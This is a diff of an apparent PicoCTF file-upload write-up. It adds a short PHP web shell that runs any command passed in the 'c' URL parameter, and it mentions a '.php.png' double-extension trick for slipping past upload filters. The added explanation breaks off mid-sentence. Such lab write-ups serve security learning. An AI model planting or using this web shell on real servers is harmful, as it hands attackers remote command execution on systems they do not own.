@@ -10,6 +10,19 @@ When I upload my malicious php file :
 
 ![](../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260306224114.png)
 
+What is this malicious file doing ? : 
+
+```
+<?php
+if(isset($_GET['c'])) {
+    echo "<pre>"; 
+    system($_GET['c']);
+    echo "</pre>";
+}
+?>
+```
+
+It allows me to add a c 
 
 
 Because of the Challenge Name, I tried to replace the file extension .php to .php.png :
